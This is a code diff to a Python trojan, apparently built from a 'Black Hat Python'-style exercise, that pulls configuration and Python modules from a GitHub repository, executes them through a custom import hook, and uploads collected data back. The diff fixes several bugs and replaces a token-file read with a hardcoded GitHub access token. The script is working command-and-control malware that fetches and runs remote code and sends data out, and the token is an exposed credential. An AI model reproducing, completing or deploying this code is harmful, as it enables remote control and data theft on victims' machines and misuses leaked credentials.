@@ -9,8 +9,7 @@ import time
 from datetime import datetime
 
 def connect_to_github():
-    with open("mytoken.txt") as f:
-        token = f.read()
+    token = "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"
     sess = github3.login(token=token)
     return sess.repository("Anderaxarex", "bhp_trojan")
 
@@ -25,7 +24,7 @@ class Trojan:
         self.data_path = f'data/{id}'
 
     def get_config(self):
-        config_file = get_content('config', self.config_file, self.repo)
+        config_file = get_content('config', f'{self.id}.json', self.repo)
         config = json.loads(base64.b64decode(config_file))
 
         for task in config:
@@ -37,7 +36,7 @@ class Trojan:
         message = datetime.now().isoformat()
         remotepath = f'data/{self.id}/{message}.data'
         bindata = bytes('%r' % data, 'utf-8')
-        self.repo.create_file(remotepath, message, base64.b64decode(bindata))
+        self.repo.create_file(remotepath, message, base64.b64encode(bindata))
 
     def module_runner(self, module):
         result = sys.modules[module].run()
@@ -59,7 +58,7 @@ class Trojan:
 class GitImporter:
     def __init__(self):
         self.current_module_code=""
-        self.repo = connect_to_github()
+        
     
     def find_module(self, name, path=None):
         print("[||] Retrieving %s" % name)
@@ -69,7 +68,7 @@ class GitImporter:
             self.current_module_code = base64.b64decode(new_library)
             return self
     
-    def load_modules(self, name):
+    def load_module(self, name):
         spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
         new_module = importlib.util.module_from_spec(spec)
         exec(self.current_module_code, new_module.__dict__)
@@ -78,5 +77,5 @@ class GitImporter:
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
-    trojan = Trojan(f'{random.randint(1000, 10000)}')
+    trojan = Trojan('conf')
     trojan.run()
